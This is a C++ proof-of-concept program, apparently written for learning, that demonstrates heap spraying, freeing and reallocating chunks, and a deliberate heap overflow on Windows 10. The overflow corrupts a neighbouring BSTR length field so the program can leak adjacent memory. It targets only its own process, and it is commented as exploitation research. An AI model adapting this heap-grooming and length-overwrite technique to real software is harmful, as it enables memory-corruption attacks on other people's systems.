#include <stdio.h>
#include <vector>
#include <Windows.h>
#include <string>
#include <comdef.h>
#include <iostream>
using namespace std;

// This program demonstrates how a heap overflow could be used to leak
// something in memory on Windows 10. So on Windows 10, the heap is heavily
// randomized, so it is really difficult to create a desirable heap layout
// we need for a heap overflow. In my experiemnt, that reliable rate went from
// 97% (Windows 7) to less than 10% (Windows 10). However, if we can track
// the allocations and frees in arrays, maybe 10% is still more than enough
// to make our attack work.
//
// Improvements still needed:
// The PoC seems reliable enough to find a layout like this:
// [Chunk][BSTR]
// But often the last chunk is something random, not a pointer.

#define OBJECTS_COUNT 0x512
#define OBJECT_SIZE 0x10
#define FREED_INDEX 0x510

class SomeObject {
public:
  vector<int> array;
  void function1() {};
  virtual void virtual_function1() {};
};

int main(){
  // The objects array is used to keep track of:
  // 1. The objects for SomeObject
  // 2. The BSTR strings
  // They are meant to be arranged like this in the array:
  // [SomeObject][BSTR][SomeObject][BSTR] ... so on.
  void* objects[OBJECTS_COUNT];

  // The newChunks array is used to keep track of the SomeObject
  // replacements. They are actually just fake objects, created by
  // malloc() and filled with strings. The intention for that is
  // we we want the layout to look like this:
  // [Fake object][BSTR][Fake object][Fake object] ... so on.
  //    ^-- tracked          ^-- tracked
  void* newChunks[OBJECTS_COUNT];

  // Allocation index
  int i;

  // Step 1 - Creating the heap layout:
  // The object spraying starts here.
  // This routine intends to create a layout like this:
  // [SomeObject][BSTR][SomeObject][BSTR] ... so on.
  //
  // Although in memory, it looks a lot like this:
  // [SomeObject][Junk][BSTR][Junk][SomeObject][Junk][BSTR] ... so on.
  // Those junks come in different sizes so that's one of the reasons
  // it is so hard to make the exploit reliable on Windows 10.
  // Hopefully, we can find the right sequence of chunks we need.
  printf("(+) Doing spray...\n");
  for (i = 0; i < OBJECTS_COUNT; i+=2) {
    SomeObject* obj = new SomeObject();
    BSTR bs = SysAllocString(L"hola");
    objects[i] = obj;
    objects[i+1] = bs;
    printf(" - %d Instance at 0x%08x\n", i, (int) objects[i]);
    printf(" - %d String at 0x%08x\n", i+1, (int) objects[i+1]);
  }

  printf("(+) Check your objects\n");
  system("PAUSE");

  // Step 2 - Freeing objects:
  // After we have a heap layout. We want to delete/free all the objects.
  // In other words, we want to go from this:
  // [SomeObject][BSTR][SomeObject][BSTR]
  //
  // To this:
  // [Free chunk][BSTR][Free chunk][BSTR]
  //
  // After they are freed, we have a chance to fill them up with arbitrary
  // chunks later.
  for (i = 0; i < OBJECTS_COUNT; i+=2) {
    delete(objects[i]);
    printf("(+) Deleted someObject at address: 0x%08x\n", (int)objects[i]);
  }

  printf("(+) Check the memory layout. We are going to overwrite the chunks\n");
  system("PAUSE");

  // Step 3 - Occupying the freed chunks
  // At this point we want to fill the freed chunks with our own, and we
  // we want to try to fill all of them, although I think it is possible
  // some chunks might go somewhere else unpredicted. For the most part,
  // that seems okay.
  //
  // Notice these allocations are tracked by a separate array (newChunks).
  // And the way the elements arranged in the array look more like this:
  // [Chunk][Hole][Chunk][Hole] ... so on
  // The "holes" are more like place holders for the BSTRs.
  // Even though the new chunks are tracked by a separate array, in memory
  // those allocations should still fall back to the same freed chunks anyway,
  // because the operating system does that.
  for (i = 0; i < OBJECTS_COUNT; i+=2) {
    char* buf = (char*) malloc(OBJECT_SIZE);
    newChunks[i] = buf;
    printf("(+) New allocation at 0x%08x\n", (int) buf);
    memset(buf, 'B', OBJECT_SIZE);
  }

  printf("(+) Check the memory layout\n");
  system("PAUSE");

  // Step 4 - Overflowing the heap chunks.
  // This part is a little tricky. There are two ways to approach this:
  // 1st: Overflow all the chunks at once, and then check every string to
  //      find one that has the right modified size we are looking for.
  //      This approach doesn't seem very ideal, because it looks like when
  //      all the chunks are overflowed, there are a lot of corrupt objects,
  //      and that tends to cause the application to crash when it's trying to
  //      convert the BSTR data to a C string.
  // 2nd: The second approach is more careful. Instead of overflowing all of them,
  //      we only overflow one chunk, and check the BSTR that's supposed to be next
  //      to it immediately. If the BSTR doesn't have the right modified size we're
  //      looking for, we overflow the next one, and check the next BSTR. This
  //      process repeats until we find the BSTR we're looking for, and then
  //      we can stop overflowing the rest of the chunks. This approach seems to
  //      make the program survive the heap overflow attack.
  for (i = 0; i < OBJECTS_COUNT; i+=2) {
    char overflow[] =
    "CCCCCCCCCCCCCCCCCCCCCCCC"                   // 24 bytes without WinDBG
    //"CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC" // 40 bytes in WinDBG
    "\xff\x00\x00\x00"                           // overwrite bstr string size
    "\x41\x00\x41\x00"                           // fake string
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00"
    "\x41\x00\x41\x00";

    // Overflow a heap chunk
    memcpy(newChunks[i], overflow, sizeof(overflow)-1);

    // This routine checks if the BSTR is the one we're looking for.
    // If it is, we attempt to convert the BSTR to a C string, so we can actually
    // see what we are leaking.
    UINT strSize = SysStringByteLen((BSTR) objects[i+1]);
    printf("(+) String size: %d at index %d\n", (int) strSize, i+1);
    // We are specifically looking for size 255 BSTR, because in our heap overflow
    // we're overflowing the size field with: "\xff\x00\x00\x00", and that translates
    // to decimal 255.
    if (strSize == 255) {
      BSTR bstr = (BSTR) objects[i+1];
      printf("(+) try leaking from bstr at address: 0x%08x\n", (int) bstr);
      printf("(+) new size of bstr: %d\n", SysStringByteLen(bstr));
      // From here, we are just converting the BSTR to C String. Apparently this
      // requires multiple steps: BSTR -> wstring -> std::string -> const char*
      printf("(+) Converting to wstring\n");
      std::wstring ws(bstr, SysStringByteLen(bstr));
      printf("(+) Converting to std::string\n");
      std::string s(ws.begin(), ws.end());
      cout << "(+) Leaked data: " <<  s << endl;
      //printf("(+) Converting to C string\n");
      //const char* leakedData = s.c_str();

      // This prints what we're leaking.
      //printf("(+) leaked: %s\n", leakedData);

      // At this point, we have found the BSTR that is correctly modified.
      // We assume the heap overflow was successful, so we don't need to continue
      // overflowing the rest the heap chunks, let's just break early.
      break;
    }
  }


  printf("(+) Done\n");
  system("PAUSE");
}

